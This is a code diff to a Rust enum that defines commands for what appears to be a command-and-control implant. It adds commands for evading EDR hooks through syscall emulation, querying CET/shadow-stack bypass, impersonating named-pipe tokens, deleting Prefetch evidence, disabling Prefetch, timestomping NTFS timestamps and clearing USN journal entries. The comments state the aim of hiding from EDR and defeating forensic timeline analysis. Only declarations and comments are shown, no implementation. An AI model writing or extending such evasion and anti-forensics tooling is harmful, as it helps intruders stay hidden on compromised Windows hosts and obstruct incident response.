@@ -884,6 +884,97 @@ pub enum Command {
         /// Optional override for the delay in seconds (uses config default if `None`).
         delay_secs: Option<u32>,
     },
+
+    // ── Syscall emulation control (Windows only) ─────────────────────────
+
+    /// Toggle user-mode NT kernel interface emulation at runtime.
+    /// When enabled, the agent routes configured Nt* calls through
+    /// kernel32/advapi32 equivalents instead of ntdll syscall stubs,
+    /// making it invisible to EDR hooks on ntdll.  The change takes
+    /// effect immediately for subsequent operations.
+    SyscallEmulationToggle {
+        /// `true` to enable emulation, `false` to disable (revert to
+        /// indirect syscalls for all calls).
+        enabled: bool,
+    },
+
+// ── CET / Shadow Stack bypass (Windows only) ─────────────────────────
+
+    /// Query the current CET (Control-flow Enforcement Technology) /
+    /// shadow-stack status on the agent host.  Returns a JSON object
+    /// describing whether CET is present, enabled, and which bypass
+    /// strategy is active.
+    CetStatus,
+
+// ── Token-only impersonation (Windows only) ──────────────────────────
+
+    /// Create a named pipe and impersonate the security context of the
+    /// first connecting client using token-only impersonation (avoids
+    /// `ImpersonateNamedPipeClient` on the main thread).  The pipe is
+    /// created with a randomised suffix if not provided.  Returns the
+    /// pipe path and the impersonated user/domain on success.
+    ImpersonatePipe {
+        /// Named pipe path (e.g. `\\.\pipe\status`).  If empty, a random
+        /// pipe name is generated.
+        pipe_name: String,
+    },
+    /// Revert the current thread's impersonation token, restoring the
+    /// original process security context.  Does NOT close cached tokens
+    /// — call `ListTokens` to inspect and release cached entries.
+    RevertToken,
+    /// List all cached impersonation tokens with their source, user,
+    /// domain, and SID.  Returns a JSON array of token metadata.
+    ListTokens,
+
+// ── Forensic cleanup — Prefetch evidence removal (Windows only) ──────
+
+    /// Clean Windows Prefetch (.pf) evidence for the specified executable
+    /// name.  If `exe_name` is empty, cleans all .pf files.  The cleanup
+    /// method (delete, patch, disable-service) is determined by config.
+    CleanPrefetch {
+        /// Executable name to clean (e.g. "cmd.exe").  If empty, all .pf
+        /// files are cleaned.
+        exe_name: String,
+    },
+    /// Disable the Windows Prefetch service by setting the EnablePrefetcher
+    /// registry value to 0.  Returns the original value for later restore.
+    DisablePrefetch,
+    /// Restore the Windows Prefetch service to its original state (sets
+    /// EnablePrefetcher back to the value captured by `DisablePrefetch`).
+    RestorePrefetch,
+
+    /// Synchronise MFT timestamps ($SI + $FN) for the specified file to
+    /// match the timestamps of a reference file.  Sets all 8 NTFS
+    /// timestamps (4 in $STANDARD_INFORMATION + 4 in $FILE_NAME) to a
+    /// consistent "cover time" to prevent forensic timeline analysis.
+    Timestomp {
+        /// Path to the file whose timestamps should be modified.
+        file_path: String,
+        /// Path to the reference file whose timestamps to copy.  If empty,
+        /// uses the configured default reference file (typically ntdll.dll).
+        reference_file: String,
+    },
+    /// Synchronise MFT timestamps for all files in a directory to match
+    /// the timestamps of a reference file.  Recursively processes all
+    /// files in the directory tree.
+    TimestompDirectory {
+        /// Path to the directory whose files should be timestamped.
+        dir_path: String,
+        /// Path to the reference file whose timestamps to copy.  If empty,
+        /// uses the configured default reference file.
+        reference_file: String,
+    },
+    /// Clean USN journal entries for a volume.  Removes entries that
+    /// reference file modifications, preventing forensic timeline recovery
+    /// of timestamp changes.
+    CleanUsn {
+        /// Volume path (e.g. "C:").  If empty, operates on the system volume.
+        volume: String,
+    },
+    /// Synchronise timestamps for all recently modified files.  Scans for
+    /// files modified within the current session and applies cover
+    /// timestamps from the configured reference file.
+    SyncTimestamps,
 }
 
 /// AMSI bypass strategy selector.
